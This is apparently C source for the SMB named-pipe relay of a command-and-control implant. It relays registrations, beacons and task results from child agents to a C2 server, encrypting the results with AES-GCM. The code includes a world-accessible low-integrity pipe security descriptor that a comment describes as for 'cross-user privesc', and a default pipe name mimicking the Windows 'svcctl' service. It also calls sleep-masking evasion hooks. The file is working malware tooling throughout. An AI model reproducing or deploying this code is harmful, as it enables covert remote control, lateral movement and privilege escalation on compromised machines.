/*
 * pipe_server.c — SMB named-pipe relay server for the C agent.
 *
 * Protocol (4-byte LE length framing, same as transport_smb.c):
 *   Child → Parent: REGISTER {type,hostname,username,os,pid,transport,is_admin,language}
 *   Parent → Child: {agent_id, aes_key (base64)} (raw JSON from C2)
 *   Child → Parent: BEACON  {type,agent_id}
 *   Parent → Child: [task,...] (plaintext task array from C2, decrypted by parent)
 *   Child → Parent: RESULT  {type,agent_id,task_id,output,error,is_admin}
 *   Parent → Child: null    (ACK — C child drains one message after RESULT)
 */

#include "pipe_server.h"
#include "transport.h"
#include "crypto.h"
#include "b64.h"
#include "evasion.h"
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* ── framing (same wire format as transport_smb.c) ─────────────────────────── */

static int ps_write(HANDLE h, const uint8_t *data, DWORD len) {
    uint8_t hdr[4] = {
        (uint8_t)(len & 0xff), (uint8_t)((len >> 8) & 0xff),
        (uint8_t)((len >> 16) & 0xff), (uint8_t)((len >> 24) & 0xff)
    };
    DWORD w = 0;
    if (!WriteFile(h, hdr, 4, &w, NULL) || w != 4) return 0;
    if (len == 0) return 1;
    if (!WriteFile(h, data, len, &w, NULL) || w != len) return 0;
    return 1;
}

static uint8_t* ps_read(HANDLE h, size_t *out_len) {
    *out_len = 0;
    uint8_t hdr[4]; DWORD r = 0;
    if (!ReadFile(h, hdr, 4, &r, NULL) || r != 4) return NULL;
    size_t len = (size_t)hdr[0] | ((size_t)hdr[1] << 8) |
                 ((size_t)hdr[2] << 16) | ((size_t)hdr[3] << 24);
    if (len == 0 || len > 16 * 1024 * 1024) return NULL;
    uint8_t *buf = (uint8_t*)malloc(len + 1);
    if (!buf) return NULL;
    size_t got = 0;
    while (got < len) {
        DWORD rr = 0;
        if (!ReadFile(h, buf + got, (DWORD)(len - got), &rr, NULL) || rr == 0) {
            free(buf); return NULL;
        }
        got += rr;
    }
    buf[len] = '\0';
    *out_len = len;
    return buf;
}

/* ── tiny JSON bool helper ──────────────────────────────────────────────────── */

static int js_bool(const char *json, const char *key) {
    if (!json || !key) return 0;
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ' ' || *p == ':') p++;
    return strncmp(p, "true", 4) == 0;
}

/* Escape a string before embedding it in a JSON string value.  The child
 * transport sends usernames such as HOST\\localuser; agent_json_str() decodes
 * that to a single backslash, so forwarding the decoded value verbatim would
 * produce invalid JSON (\\l is not a JSON escape). */
static char* json_escape(const char *s) {
    if (!s) return _strdup("");

    size_t need = 1;
    for (const unsigned char *p = (const unsigned char*)s; *p; p++) {
        switch (*p) {
        case '"': case '\\': case '\n': case '\r': case '\t':
        case '\b': case '\f':
            need += 2;
            break;
        default:
            need += (*p < 0x20) ? 6 : 1; /* \\u00XX for other controls */
            break;
        }
    }

    char *out = (char*)malloc(need);
    if (!out) return NULL;
    size_t n = 0;
    for (const unsigned char *p = (const unsigned char*)s; *p; p++) {
        switch (*p) {
        case '"':  out[n++] = '\\'; out[n++] = '"';  break;
        case '\\': out[n++] = '\\'; out[n++] = '\\'; break;
        case '\n': out[n++] = '\\'; out[n++] = 'n';  break;
        case '\r': out[n++] = '\\'; out[n++] = 'r';  break;
        case '\t': out[n++] = '\\'; out[n++] = 't';  break;
        case '\b': out[n++] = '\\'; out[n++] = 'b';  break;
        case '\f': out[n++] = '\\'; out[n++] = 'f';  break;
        default:
            if (*p < 0x20) {
                static const char hex[] = "0123456789abcdef";
                out[n++] = '\\'; out[n++] = 'u';
                out[n++] = '0'; out[n++] = '0';
                out[n++] = hex[*p >> 4]; out[n++] = hex[*p & 0x0f];
            } else {
                out[n++] = (char)*p;
            }
            break;
        }
    }
    out[n] = '\0';
    return out;
}

/* ── per-connection state (heap-allocated, freed by conn_thread) ────────────── */

typedef struct {
    HANDLE  pipe;
    char    agent_id[64];
    uint8_t aes_key[32];
} ConnState;

/* ── SDDL: Everyone (WD) full access + Low-integrity SACL for cross-user privesc ── */

static SECURITY_ATTRIBUTES* make_pipe_sa(void) {
    typedef BOOL (WINAPI *FnConvert)(LPCWSTR, DWORD, PSECURITY_DESCRIPTOR*, PULONG);
    HMODULE adv = GetModuleHandleA("advapi32.dll");
    if (!adv) adv = LoadLibraryA("advapi32.dll");
    void *raw = adv ? (void*)GetProcAddress(adv,
        "ConvertStringSecurityDescriptorToSecurityDescriptorW") : NULL;
    FnConvert fn = (FnConvert)raw;
    if (!fn) return NULL;

    /* S:(ML;;NW;;;LW) — Low-integrity SACL: allows processes at any integrity
     * level (Low/Medium/High) to connect, needed for schtask batch-logon children.
     * D:(A;;0x1f019f;;;WD) — DACL: Everyone (WD) full pipe access. */
    wchar_t sddl[] = L"S:(ML;;NW;;;LW)D:(A;;0x1f019f;;;WD)";
    PSECURITY_DESCRIPTOR sd = NULL;
    if (!fn(sddl, 1 /*SDDL_REVISION_1*/, &sd, NULL) || !sd) return NULL;

    SECURITY_ATTRIBUTES *sa = (SECURITY_ATTRIBUTES*)calloc(1, sizeof(*sa));
    if (!sa) { LocalFree(sd); return NULL; }
    sa->nLength              = sizeof(*sa);
    sa->lpSecurityDescriptor = sd;
    sa->bInheritHandle       = FALSE;
    return sa;
}

static void free_pipe_sa(SECURITY_ATTRIBUTES *sa) {
    if (!sa) return;
    if (sa->lpSecurityDescriptor) LocalFree(sa->lpSecurityDescriptor);
    free(sa);
}

/* ── relay helpers ──────────────────────────────────────────────────────────── */

static void relay_beacon(HANDLE pipe, ConnState *cs) {
    char path[128];
    snprintf(path, sizeof(path), "/beacon/%s", cs->agent_id);

    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    agent_http_do("GET", path, NULL, 0, NULL, &resp, &resp_len, &status);

    if (!resp || resp_len == 0 || status == 204) {
        ps_write(pipe, (const uint8_t*)"null", 4);
        free(resp); return;
    }
    if (status != 200) {
        ps_write(pipe, (const uint8_t*)"null", 4);
        free(resp); return;
    }

    /* decrypt the beacon payload */
    size_t plain_len = 0;
    uint8_t *plain = aes_gcm_open(cs->aes_key, 32, resp, resp_len, &plain_len);
    free(resp);
    if (!plain) { ps_write(pipe, (const uint8_t*)"null", 4); return; }

    /* extract tasks array — plain is {"tasks":[...]} */
    const char *arr = strstr((char*)plain, "\"tasks\"");
    if (arr) arr = strchr(arr, '[');
    if (arr) {
        ps_write(pipe, (const uint8_t*)arr, (DWORD)strlen(arr));
    } else {
        ps_write(pipe, (const uint8_t*)"null", 4);
    }
    free(plain);
}

static void relay_result(const char *msg, ConnState *cs, HANDLE pipe) {
    long long task_id = agent_json_int(msg, "task_id");
    char *output  = agent_json_str_alloc(msg, "output");
    char *err_str = agent_json_str_alloc(msg, "error");
    int   is_admin = js_bool(msg, "is_admin");

    char *output_j = json_escape(output ? output : "");
    char *err_j    = json_escape(err_str ? err_str : "");
    if (!output_j || !err_j) {
        free(output); free(err_str); free(output_j); free(err_j);
        goto ack;
    }

    size_t body_sz = strlen(output_j) + strlen(err_j) + 256;
    char *body = (char*)malloc(body_sz);
    if (!body) {
        free(output); free(err_str); free(output_j); free(err_j);
        goto ack;
    }

    snprintf(body, body_sz,
        "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
        task_id,
        output_j, err_j,
        is_admin ? "true" : "false");
    free(output); free(err_str); free(output_j); free(err_j);

    size_t enc_len = 0;
    uint8_t *enc = aes_gcm_seal(cs->aes_key, 32,
                                (const uint8_t*)body, strlen(body), &enc_len);
    free(body);
    if (enc) {
        char path[128];
        snprintf(path, sizeof(path), "/result/%s", cs->agent_id);
        uint8_t *r2 = NULL; size_t r2l = 0; int s2 = 0;
        agent_http_do("POST", path, enc, enc_len, NULL, &r2, &r2l, &s2);
        free(enc); free(r2);
    }

ack:
    /* C children drain one ACK message after sending a RESULT */
    ps_write(pipe, (const uint8_t*)"null", 4);
}

/* ── per-connection thread ──────────────────────────────────────────────────── */

static DWORD WINAPI conn_thread(LPVOID arg) {
    ConnState *cs = (ConnState*)arg;
    HANDLE pipe   = cs->pipe;
    int entered   = 0;   /* tracks whether evasion_conn_enter() was called */

    /* read REGISTER */
    size_t mlen = 0;
    uint8_t *msg = ps_read(pipe, &mlen);
    if (!msg) goto done;

    char type_buf[32] = {0};
    agent_json_str((char*)msg, "type", type_buf, sizeof(type_buf));
    if (strcmp(type_buf, "REGISTER") != 0) { free(msg); goto done; }

    char hostname[128]={0}, username[256]={0}, os_str[64]={0}, language[32]={0};
    long long pid   = agent_json_int((char*)msg, "pid");
    int is_admin    = js_bool((char*)msg, "is_admin");
    agent_json_str((char*)msg, "hostname", hostname, sizeof(hostname));
    agent_json_str((char*)msg, "username", username, sizeof(username));
    agent_json_str((char*)msg, "os",       os_str,  sizeof(os_str));
    agent_json_str((char*)msg, "language", language, sizeof(language));
    free(msg);

    /* Inhibit sleep masking now — the HTTP relay below and message loop both
     * execute in .text; sleep_masked() must not set it PAGE_NOACCESS here. */
    evasion_conn_enter();
    entered = 1;

    /* forward registration to C2 */
    char *hostname_j = json_escape(hostname);
    char *username_j = json_escape(username);
    char *os_j       = json_escape(os_str);
    char *language_j  = json_escape(language[0] ? language : "c");
    if (!hostname_j || !username_j || !os_j || !language_j) {
        free(hostname_j); free(username_j); free(os_j); free(language_j);
        goto done;
    }

    char reg[2048];
    snprintf(reg, sizeof(reg),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\","
        "\"pid\":%lld,\"transport\":\"smb\",\"is_admin\":%s,\"language\":\"%s\","
        "\"parent_id\":\"%s\"}",
        hostname_j, username_j, os_j, pid,
        is_admin ? "true" : "false",
        language_j,
        g_agent.agent_id);
    free(hostname_j); free(username_j); free(os_j); free(language_j);

    uint8_t *resp = NULL; size_t resp_len = 0; int status = 0;
    agent_http_do("POST", "/register",
                  (const uint8_t*)reg, strlen(reg),
                  "Content-Type: application/json\r\n",
                  &resp, &resp_len, &status);
    if (!resp || status != 200) { free(resp); goto done; }

    /* parse agent_id + aes_key */
    char agent_id_buf[64]={0}, aes_b64[128]={0};
    agent_json_str((char*)resp, "agent_id", agent_id_buf, sizeof(agent_id_buf));
    agent_json_str((char*)resp, "aes_key",  aes_b64,      sizeof(aes_b64));
    if (!agent_id_buf[0] || !aes_b64[0]) { free(resp); goto done; }

    size_t key_len = 0;
    uint8_t *key = b64_decode(aes_b64, &key_len);
    if (!key || key_len < 32) { free(key); free(resp); goto done; }
    strncpy(cs->agent_id, agent_id_buf, sizeof(cs->agent_id) - 1);
    memcpy(cs->aes_key, key, 32);
    free(key);

    /* send raw C2 registration response back to child */
    ps_write(pipe, resp, (DWORD)resp_len);
    free(resp);

    /* message loop */
    for (;;) {
        size_t ml = 0;
        uint8_t *m = ps_read(pipe, &ml);
        if (!m) break;
        char mtype[32] = {0};
        agent_json_str((char*)m, "type", mtype, sizeof(mtype));
        if (strcmp(mtype, "BEACON") == 0) {
            relay_beacon(pipe, cs);
        } else if (strcmp(mtype, "RESULT") == 0) {
            relay_result((char*)m, cs, pipe);
        }
        free(m);
    }

done:
    if (entered) evasion_conn_leave();
    DisconnectNamedPipe(pipe);
    CloseHandle(pipe);
    free(cs);
    return 0;
}

/* ── accept-loop thread state ───────────────────────────────────────────────── */

#define MAX_SERVERS 8

typedef struct {
    char            name[256];   /* full pipe path */
    volatile LONG   stop;
    CRITICAL_SECTION cs;
    HANDLE          accept_h;    /* current pipe handle being waited on */
    HANDLE          thread;
} PipeServer;

static PipeServer  g_srv[MAX_SERVERS];
static int         g_srv_count = 0;
static CRITICAL_SECTION g_srv_mu;
static volatile LONG    g_initialized = 0;

static void ps_global_init(void) {
    if (InterlockedCompareExchange(&g_initialized, 1, 0) == 0) {
        InitializeCriticalSection(&g_srv_mu);
        memset(g_srv, 0, sizeof(g_srv));
    }
}

/* ── accept thread ──────────────────────────────────────────────────────────── */

static DWORD WINAPI accept_thread(LPVOID arg) {
    PipeServer *srv = (PipeServer*)arg;

    /* evasion_conn_enter() was called by pipe_server_start() BEFORE CreateThread
     * to close the race where sleep_masked() could XOR/NOACCESS .text between
     * CreateThread() returning and this thread executing its first instruction.
     * The paired evasion_conn_leave() at thread exit remains here. */

    SECURITY_ATTRIBUTES *sa = make_pipe_sa();

    wchar_t wname[256] = {0};
    MultiByteToWideChar(CP_UTF8, 0, srv->name, -1, wname, 256);

    while (!InterlockedOr(&srv->stop, 0)) {
        HANDLE h = CreateNamedPipeW(
            wname,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            65536, 65536,
            0,
            sa);
        if (h == INVALID_HANDLE_VALUE) {
            Sleep(500);
            continue;
        }

        EnterCriticalSection(&srv->cs);
        srv->accept_h = h;
        LeaveCriticalSection(&srv->cs);

        BOOL connected = ConnectNamedPipe(h, NULL);
        DWORD err = GetLastError();

        EnterCriticalSection(&srv->cs);
        srv->accept_h = NULL;
        LeaveCriticalSection(&srv->cs);

        if (InterlockedOr(&srv->stop, 0)) {
            CloseHandle(h);
            break;
        }
        /* ERROR_PIPE_CONNECTED (535): client beat us — treat as success */
        if (!connected && err != ERROR_PIPE_CONNECTED) {
            CloseHandle(h);
            continue;
        }

        ConnState *cs = (ConnState*)calloc(1, sizeof(ConnState));
        if (!cs) { DisconnectNamedPipe(h); CloseHandle(h); continue; }
        cs->pipe = h;

        HANDLE t = CreateThread(NULL, 0, conn_thread, cs, 0, NULL);
        if (t) CloseHandle(t);
        else   { DisconnectNamedPipe(h); CloseHandle(h); free(cs); }
    }

    free_pipe_sa(sa);
    evasion_conn_leave();
    return 0;
}

/* ── public API ─────────────────────────────────────────────────────────────── */

static void norm_pipe_name(const char *in, char *out, size_t out_sz) {
    if (!in || !in[0]) {
        strncpy(out, "\\\\.\\pipe\\svcctl", out_sz - 1);
    } else if (strncmp(in, "\\\\.\\pipe\\", 9) == 0 ||
               strncmp(in, "\\\\",        2) == 0) {
        strncpy(out, in, out_sz - 1);
    } else {
        snprintf(out, out_sz, "\\\\.\\pipe\\%s", in);
    }
    out[out_sz - 1] = '\0';
}

char* pipe_server_start(const char *pipe_name) {
    ps_global_init();

    char name[256] = {0};
    norm_pipe_name(pipe_name, name, sizeof(name));

    EnterCriticalSection(&g_srv_mu);

    /* idempotent — already running?  Check thread liveness too: an accept_thread
     * that died (e.g. from a startup race) leaves a stale entry with a matching
     * name but a thread that has already exited.  In that case, fall through and
     * re-create it rather than returning a false "already running" message. */
    for (int i = 0; i < g_srv_count; i++) {
        if (strcmp(g_srv[i].name, name) == 0) {
            BOOL alive = (g_srv[i].thread &&
                          WaitForSingleObject(g_srv[i].thread, 0) == WAIT_TIMEOUT);
            if (alive) {
                LeaveCriticalSection(&g_srv_mu);
                char *r = (char*)malloc(512);
                if (r) snprintf(r, 512, "[*] pipe server already running on %s", name);
                return r;
            }
            /* Thread is dead — clean up the stale entry and fall through to restart. */
            if (g_srv[i].thread) { CloseHandle(g_srv[i].thread); g_srv[i].thread = NULL; }
            DeleteCriticalSection(&g_srv[i].cs);
            g_srv_count--;
            if (i < g_srv_count) g_srv[i] = g_srv[g_srv_count];
            memset(&g_srv[g_srv_count], 0, sizeof(g_srv[g_srv_count]));
            break;
        }
    }

    if (g_srv_count >= MAX_SERVERS) {
        LeaveCriticalSection(&g_srv_mu);
        return strdup("[-] too many pipe servers (max 8)");
    }

    PipeServer *srv = &g_srv[g_srv_count];
    memset(srv, 0, sizeof(*srv));
    strncpy(srv->name, name, sizeof(srv->name) - 1);
    srv->stop     = 0;
    srv->accept_h = NULL;
    InitializeCriticalSection(&srv->cs);

    /* Increment BEFORE CreateThread: closes the race where sleep_masked() fires
     * between CreateThread() returning and accept_thread executing its first
     * instruction in .text.  If accept_thread sees .text PAGE_NOACCESS on entry
     * it faults and the thread dies silently, leaving the pipe never created. */
    evasion_conn_enter();
    srv->thread = CreateThread(NULL, 0, accept_thread, srv, 0, NULL);
    if (!srv->thread) {
        evasion_conn_leave();
        DeleteCriticalSection(&srv->cs);
        LeaveCriticalSection(&g_srv_mu);
        return strdup("[-] CreateThread failed for pipe server");
    }
    g_srv_count++;
    LeaveCriticalSection(&g_srv_mu);

    char *r = (char*)malloc(512);
    if (r) snprintf(r, 512, "[+] pipe server started on %s", name);
    return r;
}

char* pipe_server_stop(const char *pipe_name) {
    ps_global_init();

    EnterCriticalSection(&g_srv_mu);

    if (!pipe_name || !pipe_name[0]) {
        /* stop all */
        int n = g_srv_count;
        if (n == 0) {
            LeaveCriticalSection(&g_srv_mu);
            return strdup("[*] no pipe servers running");
        }
        for (int i = 0; i < n; i++) {
            PipeServer *srv = &g_srv[i];
            InterlockedExchange(&srv->stop, 1);
            EnterCriticalSection(&srv->cs);
            HANDLE h = srv->accept_h;
            LeaveCriticalSection(&srv->cs);
            if (h) CancelIoEx(h, NULL);
            if (srv->thread) {
                WaitForSingleObject(srv->thread, 3000);
                CloseHandle(srv->thread);
                srv->thread = NULL;
            }
            DeleteCriticalSection(&srv->cs);
        }
        g_srv_count = 0;
        LeaveCriticalSection(&g_srv_mu);

        char *r = (char*)malloc(64);
        if (r) snprintf(r, 64, "[+] stopped %d pipe server(s)", n);
        return r;
    }

    char name[256] = {0};
    norm_pipe_name(pipe_name, name, sizeof(name));

    for (int i = 0; i < g_srv_count; i++) {
        if (strcmp(g_srv[i].name, name) != 0) continue;
        PipeServer *srv = &g_srv[i];
        InterlockedExchange(&srv->stop, 1);
        EnterCriticalSection(&srv->cs);
        HANDLE h = srv->accept_h;
        LeaveCriticalSection(&srv->cs);
        if (h) CancelIoEx(h, NULL);
        if (srv->thread) {
            WaitForSingleObject(srv->thread, 3000);
            CloseHandle(srv->thread);
        }
        DeleteCriticalSection(&srv->cs);
        /* compact array */
        g_srv_count--;
        if (i < g_srv_count) g_srv[i] = g_srv[g_srv_count];
        memset(&g_srv[g_srv_count], 0, sizeof(g_srv[g_srv_count]));
        LeaveCriticalSection(&g_srv_mu);

        char *r = (char*)malloc(512);
        if (r) snprintf(r, 512, "[+] pipe server on %s stopped", name);
        return r;
    }

    LeaveCriticalSection(&g_srv_mu);
    char *r = (char*)malloc(512);
    if (r) snprintf(r, 512, "[-] no pipe server running on %s", name);
    return r;
}
